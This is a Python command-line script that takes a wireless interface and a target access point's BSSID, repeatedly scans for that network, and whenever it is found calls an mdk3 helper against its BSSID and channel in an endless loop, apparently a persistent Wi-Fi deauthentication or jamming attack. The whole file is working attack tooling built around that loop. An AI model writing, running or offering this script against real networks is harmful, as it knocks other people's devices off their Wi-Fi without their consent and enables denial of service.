from __future__ import annotations

import os
import threading
import time
from typing import Any, NoReturn, Self, Union

import click
import playsound
from dotenv import load_dotenv
from rich.panel import Panel
from rich.traceback import install

from console import console
from func import get_networks, mdk3, print_table, sleep
from logger import logger

load_dotenv()


class Target(object):

    def __init__(
        self: Self,
        interface: str,
        bssid: str,
        /,
        interval: int = 30,
        debug: bool = False,
    ) -> None:
        self.interface = interface
        self.bssid = bssid.lower()
        self.interval = interval
        self.debug = debug

    def __setattr__(self, name: str, value: Any, /) -> None:
        return super().__setattr__(name, value)

    def __getattribute__(self, name: str, /) -> Any:
        try:
            return super().__getattribute__(name)
        except AttributeError as err:
            if self.debug:
                logger.error(err)

    def __repr__(self) -> str:
        return f"<{__name__}.Target bssid={self.bssid!r} ssid={self.ssid!r} channel={self.channel!r} power={self.power!r} object at 0x{id(self):x}>"

    @property
    def bssid(self: Self) -> str:
        return self._bssid

    @bssid.setter
    def bssid(self: Self, value: str) -> None:
        self._bssid = value

    @property
    def channel(self) -> Union[int, None]:
        if hasattr(self, "_channel"):
            return self._channel

    @channel.setter
    def channel(self, ch):
        self._channel = ch

    @property
    def ssid(self):
        if hasattr(self, "_ssid"):
            return self._ssid

    @ssid.setter
    def ssid(self, value):
        if self.ssid and self.ssid != value:
            self.play()

        self._ssid = value

    def find(self: Self) -> int:
        networks = get_networks(self.interface)

        if network := networks.get(self.bssid):
            self.channel, self.ssid, self.power = network

            logger.info(f"Target was found on {self.channel!r} channel.")
            console.print(
                Panel.fit(
                    f"{self!s}",
                    title="TARGET WAS FOUND!!!",
                    highlight=True,
                )
            )

            return 1
        else:
            self.ssid = self.power = self.channel = None

            logger.info("Target was not found!!!")
            print_table(console, networks)

        return 0

    def attack(self: Self) -> NoReturn:
        while True:
            if self.find():
                mdk3(self.interface, self.bssid, self.channel)

                sleep(self.interval)
            else:
                time.sleep(2.5)

    def start(self: Self):
        pass

    def play(self: Self):
        if sound := os.getenv("SOUND"):
            threading.Thread(target=playsound.playsound, args=(sound,)).start()


@click.command()
@click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
@click.option("--interval", type=int, default=60)
@click.option("--debug", is_flag=True, default=False)
@click.argument("interface")
def main(bssid: str, interval: int, debug: bool, interface: str) -> None:
    target: Target = Target(interface, bssid, interval=interval, debug=debug)

    target.attack()


if __name__ == "__main__":
    install()
    main()
